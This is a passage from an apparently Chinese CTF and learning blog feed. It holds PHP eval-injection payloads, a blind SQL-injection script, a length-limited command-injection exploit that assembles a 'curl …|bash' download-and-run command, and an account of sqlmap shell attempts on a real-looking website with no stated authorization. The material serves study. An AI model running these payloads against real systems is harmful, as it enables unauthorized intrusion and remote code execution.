<p>key为我们传入的值 为cache就进入以下判断，看了一下 似乎没有对我们可以利用的函数：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404174527.png" alt="img" style="zoom:67%;"><br>到了eval函数这里：</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404175221.png" alt="img" style="zoom:67%;">

<p>在这里进行正则匹配的过滤，但是看了一下其他的payload，说是有进行过滤，但是看了一下 发现没有呀，然后此时只需要对这里进行payload的构造就行了,整个流程还挺明确的，就是用户传入的值 会进入到clear()函数中，期间也没什么绕弯子的地方。。<br>接下来需要做的就是构造payload闭合前面的内容实现eval命令执行:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;a[&#39;&#x2F;&#39;]);phpinfo(</span><br></pre></td></tr></table></figure>

<p>由于后面会拼接回来一个);所以这里后面的内容可以不要，但是要执行其他命令要吧后面的内容给注释掉，所以payload为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxxxxxxxxx ?a&#x3D;a[&#39;&#x2F;&#39;]);system(&#39;cat &#x2F;flag&#39;);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h2><p>关于收获：<br>1.对于调试其实已经不算陌生了，拿到题目获得源码后其实我是有点无从下手的，感觉是太久没调试手生了，通过这题，以后就要记得调试的基操了，尤其是通过<strong>输出各个变量</strong>确定我们输入的值，从而达到成功构造出闭合语句的效果</p>
]]></content>
  </entry>
  <entry>
    <title>记录一次不完全简单的渗透测试</title>
    <url>/2021/01/14/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>引语：之前打比赛之前，学长给我推了一个网站，让我去尝试拿shell,毕竟是第一次，还是学到了很多有用的东西，故记录一下。                                             <a id="more"></a></p>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>学长跟我说，存在sql注入点，并且给我推送的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210114135848.png" alt="img" style="zoom:50%;"><br>网页一打开，出现这两个框，刚刷完靶场的我，一看到这个就以为注入点在这里，在尝试了几次无果之后，决定利用sqlmap跑一下，利用跑POST的方法，跑了好几次，都没有任何结果，我不禁在想，也许注入点不在这里，并且继续用post的方法，在文本上的referer、cookie等处加*号，定点扫描注入点，但是都没有结果<br>后来经过学长点醒，我回到网页在url上寻找，发现，当我切换英文的时候<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210114140353.png" alt="img"></p>
<p>这个?lang=4后面的数字发生了改变，猜想是不是在这里，后来用sqlmap跑了一下，果然在这里</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210114140825.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210114141406.png" alt="img" style="zoom:67%;">

<p>以上是跑出来的数据库，不过我们的目标不是这个，而是拿shell</p>
<p><strong>问题1：为什么我用post的方式跑refer的时候 跑不出来呢</strong></p>
<h2 id="sqlmap-–os-shell反弹shell"><a href="#sqlmap-–os-shell反弹shell" class="headerlink" title="sqlmap –os-shell反弹shell"></a>sqlmap –os-shell反弹shell</h2><p>我记得在上一次的时候可以直接反弹，但是不知道为啥这次不行，大概是路径换了？所以需要寻找绝对路径</p>
]]></content>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向入门（一）</title>
    <url>/2021/05/09/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>汇编学习</title>
    <url>/2021/02/21/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="1-1计算机系统概述"><a href="#1-1计算机系统概述" class="headerlink" title="1.1计算机系统概述"></a>1.1计算机系统概述</h1><p>硬件系统：构成计算机的各种物质实体的总和<br>软件系统：计算机上全部可运行程序的总和</p>
<h2 id="x86微处理器的结构"><a href="#x86微处理器的结构" class="headerlink" title="x86微处理器的结构"></a>x86微处理器的结构</h2><h3 id="指令执行单元EU"><a href="#指令执行单元EU" class="headerlink" title="指令执行单元EU"></a>指令执行单元EU</h3><p>EU部分负责指令的执行，由ALU、标志寄存器、通用寄存器、数据寄存器和EU控制单元组成，不与系统外线相连<br>主要实现两种操作:<br>1.根据指令进行算数/逻辑运算；<br>2.EU计算出指令要求寻址单元地址的偏移量，送BIU，以形成一个20位的物理地址，到存储器存取所要求的的操作数</p>
<h3 id="总线接口单元BIU"><a href="#总线接口单元BIU" class="headerlink" title="总线接口单元BIU"></a>总线接口单元BIU</h3><p>BIU负责与存储器接口——CPU和存储器之间的信息传送<br>由地址加法器、段寄存器（CS、DS、ES、SS）、指令指针IP、指令队列和总线控制逻辑组成。</p>
<h3 id="和指令队列之间的合作"><a href="#和指令队列之间的合作" class="headerlink" title="和指令队列之间的合作"></a>和指令队列之间的合作</h3><p>指令队列是一个6字节的寄存器，队列中同时最多可存6个字节指令、是一个先进先出的栈。<strong>当指令队列空的时候，BIU自动执行总线操作，取指令存入指令队列。当程序发生转义的时候，则BIU要重新取出指令，这是 BIU取出的指令将直接送EU执行，然后BIU将不断取指令填入指令队列中，当指令有写存储器要求，则通知BIU，由BIU把指令结果写到存储器中，然后再去指令到指令队列中</strong></p>
<h2 id="X86寄存器"><a href="#X86寄存器" class="headerlink" title="X86寄存器"></a>X86寄存器</h2><p><code>数据寄存器、指针及变址寄存器、段寄存器、控制寄存器</code></p>
<h3 id="1-数据寄存器"><a href="#1-数据寄存器" class="headerlink" title="1.数据寄存器"></a>1.数据寄存器</h3><p>包括AX、BC、CX和DX四个通用寄存器，它们用来暂时存放运算过程中所用到的操作数、结果数据或其他信息，既可以以16位字长的形式来使用，也可以用8位字节的形式使用</p>
<h4 id="AX"><a href="#AX" class="headerlink" title="AX"></a>AX</h4><p>作为累加器，自乘时提供一个操作数并存放积的低位，字除时提供被除数的低位并存放商。另外，所有的输入输出指令都是用这一寄存器与外部设备传送信息</p>
<h4 id="BX"><a href="#BX" class="headerlink" title="BX"></a>BX</h4><p>可以用作通用寄存器；在计算存储器地址时，它经常用作基址寄存器；在XLAT指令中提供被查表格中源操作数的间接地址</p>
<h3 id="2-指针及变址寄存器"><a href="#2-指针及变址寄存器" class="headerlink" title="2.指针及变址寄存器"></a>2.指针及变址寄存器</h3><p><code>SP、BP、SI、DI</code>四个十六位寄存器</p>
<h2 id="X86指令集的基本特色"><a href="#X86指令集的基本特色" class="headerlink" title="X86指令集的基本特色"></a>X86指令集的基本特色</h2><p>1.向下兼容（对前一代处理器的扩展）<br>2.变长指令<br>1-15字节，多数为2-3字节长度<br>3.多种寻址方式（可访问不对齐内存地址<br>4.指令集的通用寄存器个数有限<br>x86-32系统下拥有8个通用寄存器（x86-64拓展到16个）<br>至多能有一个操作数在内存中，另一个操作数为立即数或者寄存器</p>
]]></content>
  </entry>
  <entry>
    <title>i春秋12</title>
    <url>/2021/03/07/i%E6%98%A5%E7%A7%8B12/</url>
    <content><![CDATA[<h2 id="web——Mangager"><a href="#web——Mangager" class="headerlink" title="web——Mangager"></a>web——Mangager</h2><p>感觉就像是sql注入，但是过滤了’ 所以要寻找一下其他信息， 查看源码，发现<a id="more"></a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$(<span class="built_in">document</span>).keydown(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (e.keyCode == <span class="number">222</span> || e.keyCode == <span class="number">188</span> || e.keyCode == <span class="number">190</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;Illegal character&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getnonce</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> text = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> possible = <span class="string">&quot;0123456789abcdef&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">40</span>; i++)</span><br><span class="line">        text += possible.charAt(<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * possible.length));</span><br><span class="line">    <span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br><span class="line">$(<span class="string">&#x27;#submit&#x27;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>._nonce = getnonce();</span><br><span class="line">&#125;);<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Js看不太懂，百度完各个函数后大致可以知道:<br>text的长度为40每个字符的算法是，先得到一个随机数，然后*possible的长度，最后取整，看是多少，然后再possible里面去这个是用来生成提交时的一个验证的<br>但是当我们输入两个一样的username的时候，_nonce的值是不变的于是再去看看有没有其他源码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sign</span> (<span class="params">data, key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> privateKey</span><br><span class="line">    <span class="keyword">var</span> i, j</span><br><span class="line">    <span class="keyword">var</span> W = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">80</span>)</span><br><span class="line">    <span class="keyword">var</span> A, B, C, D, E</span><br><span class="line">    <span class="keyword">var</span> H0 = <span class="number">0x97B5D3F1</span></span><br><span class="line">    <span class="keyword">var</span> H1 = <span class="number">0x1F3D5B79</span></span><br><span class="line">    <span class="keyword">var</span> H2 = <span class="number">0x684A2C0E</span></span><br><span class="line">    <span class="keyword">var</span> H3 = <span class="number">0xE0C2A486</span></span><br><span class="line">    <span class="keyword">var</span> H4 = <span class="number">0x33221100</span></span><br><span class="line">    <span class="keyword">var</span> H5 = <span class="number">0xF0F0F0F0</span></span><br><span class="line">    <span class="keyword">var</span> temp</span><br><span class="line">    <span class="keyword">var</span> _RSA = <span class="function"><span class="keyword">function</span> (<span class="params">n, s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> t4 = (n &lt;&lt; s) | (n &gt;&gt;&gt; (<span class="number">32</span> - s))</span><br><span class="line">        <span class="keyword">return</span> t4</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> _Rot = <span class="function"><span class="keyword">function</span> (<span class="params">val</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">var</span> i</span><br><span class="line">        <span class="keyword">var</span> v</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">7</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            v = (val &gt;&gt;&gt; (i * <span class="number">4</span>)) &amp; <span class="number">0x0f</span></span><br><span class="line">            str += v.toString(<span class="number">16</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str</span><br><span class="line">    &#125;</span><br><span class="line">    str = <span class="built_in">unescape</span>(<span class="built_in">encodeURIComponent</span>(key + data))</span><br><span class="line">    <span class="keyword">var</span> strLen = str.length</span><br><span class="line">    <span class="keyword">var</span> wordArray = []</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; strLen - <span class="number">3</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        j = str.charCodeAt(i) &lt;&lt; <span class="number">24</span> |</span><br><span class="line">            str.charCodeAt(i + <span class="number">1</span>) &lt;&lt; <span class="number">16</span> |</span><br><span class="line">            str.charCodeAt(i + <span class="number">2</span>) &lt;&lt; <span class="number">8</span> |</span><br><span class="line">            str.charCodeAt(i + <span class="number">3</span>)</span><br><span class="line">        wordArray.push(j)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (strLen % <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            i = <span class="number">0x080000000</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            i = str.charCodeAt(strLen - <span class="number">1</span>) &lt;&lt; <span class="number">24</span> | <span class="number">0x0800000</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            i = str.charCodeAt(strLen - <span class="number">2</span>) &lt;&lt; <span class="number">24</span> | str.charCodeAt(strLen - <span class="number">1</span>) &lt;&lt; <span class="number">16</span> | <span class="number">0x08000</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            i = str.charCodeAt(strLen - <span class="number">3</span>) &lt;&lt; <span class="number">24</span> |</span><br><span class="line">                str.charCodeAt(strLen - <span class="number">2</span>) &lt;&lt; <span class="number">16</span> |</span><br><span class="line">                str.charCodeAt(strLen - <span class="number">1</span>) &lt;&lt;</span><br><span class="line">            <span class="number">8</span> | <span class="number">0x80</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    wordArray.push(i)</span><br><span class="line">    <span class="keyword">while</span> ((wordArray.length % <span class="number">16</span>) !== <span class="number">14</span>) &#123;</span><br><span class="line">        wordArray.push(<span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    wordArray.push(strLen &gt;&gt;&gt; <span class="number">29</span>)</span><br><span class="line">    wordArray.push((strLen &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0x0ffffffff</span>)</span><br><span class="line">    H0 ^= H5</span><br><span class="line">    H1 ^= H5</span><br><span class="line">    H2 ^= H5</span><br><span class="line">    H3 ^= H5n c</span><br><span class="line">    H4 ^= H5</span><br><span class="line">    <span class="keyword">for</span> (privateKey = <span class="number">0</span>; privateKey &lt; wordArray.length; privateKey += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">            W[i] = wordArray[privateKey + i]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">16</span>; i &lt;= <span class="number">79</span>; i++) &#123;</span><br><span class="line">            W[i] = _RSA(W[i - <span class="number">3</span>] ^ W[i - <span class="number">8</span>] ^ W[i - <span class="number">14</span>] ^ W[i - <span class="number">16</span>], <span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        A = H0</span><br><span class="line">        B = H1</span><br><span class="line">        C = H2</span><br><span class="line">        D = H3</span><br><span class="line">        E = H4</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; i++) &#123;</span><br><span class="line">            temp = (_RSA(A, <span class="number">5</span>) + ((B &amp; C) | (~B &amp; D)) + <span class="number">0x5A820000</span> + E + W[i] + <span class="number">0x00007999</span>) &amp; <span class="number">0x0ffffffff</span></span><br><span class="line">            E = D</span><br><span class="line">            D = C</span><br><span class="line">            C = _RSA(B, <span class="number">30</span>)</span><br><span class="line">            B = A</span><br><span class="line">            A = temp</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">20</span>; i &lt;= <span class="number">39</span>; i++) &#123;</span><br><span class="line">            temp = (_RSA(A, <span class="number">5</span>) + (B ^ C ^ D) + <span class="number">0x6ED90000</span> + E + W[i] + <span class="number">0x0000EBA1</span>) &amp; <span class="number">0x0ffffffff</span></span><br><span class="line">            E = D</span><br><span class="line">            D = C</span><br><span class="line">            C = _RSA(B, <span class="number">30</span>)</span><br><span class="line">            B = A</span><br><span class="line">            A = temp</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">40</span>; i &lt;= <span class="number">59</span>; i++) &#123;</span><br><span class="line">            temp = (_RSA(A, <span class="number">5</span>) + ((B &amp; C) | (B &amp; D) | (C &amp; D)) + <span class="number">0x8F1B0000</span> + E + W[i] + <span class="number">0x0000BCDC</span>) &amp; <span class="number">0x0ffffffff</span></span><br><span class="line">            E = D</span><br><span class="line">            D = C</span><br><span class="line">            C = _RSA(B, <span class="number">30</span>)</span><br><span class="line">            B = A</span><br><span class="line">            A = temp</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">60</span>; i &lt;= <span class="number">79</span>; i++) &#123;</span><br><span class="line">            temp = (_RSA(A, <span class="number">5</span>) + (B ^ C ^ D) + <span class="number">0xCA620000</span> + E + W[i] + <span class="number">0x0000C1D6</span>) &amp; <span class="number">0x0ffffffff</span></span><br><span class="line">            E = D</span><br><span class="line">            D = C</span><br><span class="line">            C = _RSA(B, <span class="number">30</span>)</span><br><span class="line">            B = A</span><br><span class="line">            A = temp</span><br><span class="line">        &#125;</span><br><span class="line">        H0 = (H0 + A) &amp; <span class="number">0x0ffffffff</span></span><br><span class="line">        H1 = (H1 + B) &amp; <span class="number">0x0ffffffff</span></span><br><span class="line">        H2 = (H2 + C) &amp; <span class="number">0x0ffffffff</span></span><br><span class="line">        H3 = (H3 + D) &amp; <span class="number">0x0ffffffff</span></span><br><span class="line">        H4 = (H4 + E) &amp; <span class="number">0x0ffffffff</span></span><br><span class="line">    &#125;</span><br><span class="line">    temp = _Rot(H0) + _Rot(H1) + _Rot(H2) + _Rot(H3) + _Rot(H4)</span><br><span class="line">    <span class="keyword">return</span> temp.toLowerCase()</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	$(<span class="string">&quot;#&quot;</span> + <span class="string">&quot;f&quot;</span> + <span class="string">&quot;r&quot;</span> + <span class="string">&quot;m&quot;</span> + <span class="string">&quot;l&quot;</span> + <span class="string">&quot;o&quot;</span> + <span class="string">&quot;g&quot;</span> + <span class="string">&quot;i&quot;</span> + <span class="string">&quot;n&quot;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">	    <span class="keyword">var</span> z1 = $(<span class="string">&quot;#&quot;</span> + <span class="string">&quot;u&quot;</span> + <span class="string">&quot;s&quot;</span> + <span class="string">&quot;e&quot;</span> + <span class="string">&quot;r&quot;</span> + <span class="string">&quot;n&quot;</span> + <span class="string">&quot;a&quot;</span> + <span class="string">&quot;m&quot;</span> + <span class="string">&quot;e&quot;</span>).val();</span><br><span class="line">	    <span class="keyword">var</span> z2 = $(<span class="string">&quot;#&quot;</span> + <span class="string">&quot;p&quot;</span> + <span class="string">&quot;a&quot;</span> + <span class="string">&quot;s&quot;</span> + <span class="string">&quot;s&quot;</span> + <span class="string">&quot;w&quot;</span> + <span class="string">&quot;o&quot;</span> + <span class="string">&quot;r&quot;</span> + <span class="string">&quot;d&quot;</span>).val();</span><br><span class="line">	    $(<span class="string">&#x27;&lt;&#x27;</span> + <span class="string">&#x27;i&#x27;</span> + <span class="string">&#x27;n&#x27;</span> + <span class="string">&#x27;p&#x27;</span> + <span class="string">&#x27;u&#x27;</span> + <span class="string">&#x27;t&#x27;</span> + <span class="string">&#x27;&gt;&#x27;</span>).attr(&#123;</span><br><span class="line">		    type: <span class="string">&#x27;h&#x27;</span> + <span class="string">&#x27;i&#x27;</span> + <span class="string">&#x27;d&#x27;</span> + <span class="string">&#x27;d&#x27;</span> + <span class="string">&#x27;e&#x27;</span> + <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">		    name: <span class="string">&#x27;_&#x27;</span> + <span class="string">&#x27;n&#x27;</span> + <span class="string">&#x27;o&#x27;</span> + <span class="string">&#x27;n&#x27;</span> + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">		    value: sign(z1 + z2, <span class="string">&quot;YTY&quot;</span> + <span class="string">&quot;0Yj&quot;</span> + <span class="string">&quot;M0Y&quot;</span> + <span class="string">&quot;2Rh&quot;</span> + <span class="string">&quot;ZTZ&quot;</span> + <span class="string">&quot;iMj&quot;</span> + <span class="string">&quot;liZ&quot;</span> + <span class="string">&quot;jFj&quot;</span> + <span class="string">&quot;OTQ&quot;</span> + <span class="string">&quot;xOD&quot;</span> + <span class="string">&quot;==&quot;</span>)</span><br><span class="line">		&#125;).appendTo(<span class="string">&#x27;#&#x27;</span> + <span class="string">&#x27;f&#x27;</span> + <span class="string">&#x27;r&#x27;</span> + <span class="string">&#x27;m&#x27;</span> + <span class="string">&#x27;l&#x27;</span> + <span class="string">&#x27;o&#x27;</span> + <span class="string">&#x27;g&#x27;</span> + <span class="string">&#x27;i&#x27;</span> + <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里找到两部分源码，可以发现_nonce是key+username+password组成的，接下来通过SHA1（因为这里是80个字符）的加密得到的。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210311150158.png" alt="img" style="zoom:67%;"></p>
<p>接下来将username换成注入语句试试</p>
<p>当我们使用admin’and 1=1#的时候 页面回显是Incorrect password! 当我们使用admin’and 1=2#时，页面回显是User name does not exist此时，这里就可以使用盲注脚本，编写一下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">r&quot;http://83cb089ea0e440d5a7c26fb473e06defc9a769f1f7394b84.changame.ichunqiu.com/login.php&quot;</span></span><br><span class="line">headers=s.get(url).headers</span><br><span class="line">payload=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzQWERTYUIOPLKJHGFDSAZXCVBNM!@#$%^&amp;*()_+&#125;&#123;&quot;</span></span><br><span class="line">text=<span class="string">&quot;1&quot;</span></span><br><span class="line">pass_go=<span class="string">&quot;&quot;</span></span><br><span class="line">fi_result=<span class="string">&quot;&quot;</span></span><br><span class="line">null=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payload:</span><br><span class="line">        pass_go=<span class="string">f&quot;admin&#x27;and substr(database(),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;#&quot;</span></span><br><span class="line">        hash_encode =<span class="string">&quot;YTY0YjM0Y2RhZTZiMjliZjFjOTQxOD==&quot;</span>+pass_go+<span class="string">&quot;1&quot;</span></span><br><span class="line">        hash_encode = hashlib.sha1(hash_encode.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">        data =&#123;<span class="string">&quot;username&quot;</span>:pass_go,<span class="string">&quot;passwowrd&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;submit&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;_nonce&quot;</span>:hash_encode&#125;</span><br><span class="line">        print(data)</span><br><span class="line">        print(s.post(url,headers=headers,data=data).text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Incorrect password!&quot;</span> <span class="keyword">in</span> s.post(url,headers=headers,data=data).text:</span><br><span class="line">            fi_result+=j</span><br><span class="line">            print(fi_result)</span><br></pre></td></tr></table></figure>

<p>反复检查了好几遍，都没发现脚本有什么问题，看了一下wp，直接复制别人的脚本也没跑出来，不知道是哪里出了问题</p>
<h2 id="web——粗心的小李"><a href="#web——粗心的小李" class="headerlink" title="web——粗心的小李"></a>web——粗心的小李</h2><p>看到标题，git泄露扫描一下</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210311191635.png" alt="img" style="zoom:67%;">
扫到一个index.html打开就有flag了

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n1book&#123;git_looks_s0_easyfun&#125;</span><br></pre></td></tr></table></figure>



<h2 id="web——babyfirst-revenge"><a href="#web——babyfirst-revenge" class="headerlink" title="web——babyfirst-revenge"></a>web——babyfirst-revenge</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">&#x27;/www/sandbox/&#x27;</span> . md5(<span class="string">&quot;orange&quot;</span> . $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; strlen($_GET[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>得到以上代码，开头很熟悉，之前也有做过类似的，这里直接搬运一下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sandbox = <span class="string">&quot;sandbox/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> .<span class="string">&quot;175.43.121.213&quot;</span>);</span><br><span class="line"><span class="keyword">print</span>($sandbox);</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//curl httpbin.org/ip</span></span><br><span class="line"><span class="comment">#sandbox/abb91d64b309e1928c7725fcefde973b</span></span><br></pre></td></tr></table></figure>

<p>审计一下代码:get一个cmd，并且其长度要小于5，如果小于5就会执行该命令，所以我们要构造一个长度小于5的命令去执行:<br>这里参考一篇文章<a href="https://blog.csdn.net/hunanchenxingyu/article/details/45047813">https://blog.csdn.net/hunanchenxingyu/article/details/45047813</a><br><strong>linux可以是用反斜杠实现参数换行，表示下一行是当前行的续行。</strong><br>但是我们可以直接题目中一个片段一个片段的输入吗？显然是不行的，所以我们要将输入的命令存储在文件中，然后执行文件的时候即可执行我们的指令了。但是尽管我们输入ls，画面依旧没有回显，所以这里需要考虑反弹shell或者写马这里直接甩脚本吧：<br>插一句题外话：在做i春秋题目的时候 总有种题目有年代的感觉，询问完老师后发现确实如此，所以想赶紧去buu 或者攻防世界刷点新题，但是想了一下还是耐着性子先把这题做完吧！<br><strong>思路：</strong><br><strong>1.绕过长限制执行多条命令，需要将命令放到文件中执行</strong><br><strong>2.如何将命令放到文件中执行呢？</strong><br><strong>3.使用输出重定向符号</strong><br><strong>4.通过在目录下建立多个文件，使用ls将所有文件名重定向至新文件中，对文件使用读取命令即可</strong><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210315001830.png" alt="img" style="zoom:67%;"></p>
<p>由于本题无法输出内容所以我们只能根据反弹shell或者写马来做：<br>这里是脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://192.168.248.132:8083/index.php?cmd=%s&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    re = requests.get(<span class="string">&#x27;http://192.168.248.132:8083/index.php?reset=1&#x27;</span>)</span><br><span class="line">    payload = [</span><br><span class="line">                <span class="string">&#x27;&gt;-t\\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;&gt;\&gt;A&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;&gt;l\\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;&gt;s\ \\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;ls&gt;B&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;ls&gt;&gt;B&#x27;</span>,</span><br><span class="line"></span><br><span class="line">                <span class="string">&#x27;&gt;ash&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;&gt;\|b\\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;&gt;2\\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;&gt;1:8\\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;&gt;8.\\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;&gt;24\\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;&gt;68.\\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;&gt;2.1\\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;&gt;19\\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;&gt;l\ \\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;&gt;cur\\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;sh%20B&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;sh%20A&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> payload:</span><br><span 